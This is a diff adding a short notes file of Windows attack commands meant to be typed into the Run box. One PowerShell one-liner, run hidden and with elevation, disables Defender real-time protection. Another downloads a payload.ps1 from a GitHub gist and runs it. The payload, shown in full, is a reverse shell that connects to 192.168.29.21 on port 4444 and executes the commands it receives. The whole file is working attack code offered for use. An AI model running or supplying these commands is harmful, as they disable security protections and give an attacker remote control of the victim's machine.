@@ -1,0 +1,11 @@
+# In the run box
+
+powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+
+powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/f11ca23f0f7adbb3c67a22ce70453aaee83ceeae/payload.ps1');"
+
+
+
+# payload.ps1
+
+$sm=(New-Object Net.Sockets.TCPClient(192.168.29.21,4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
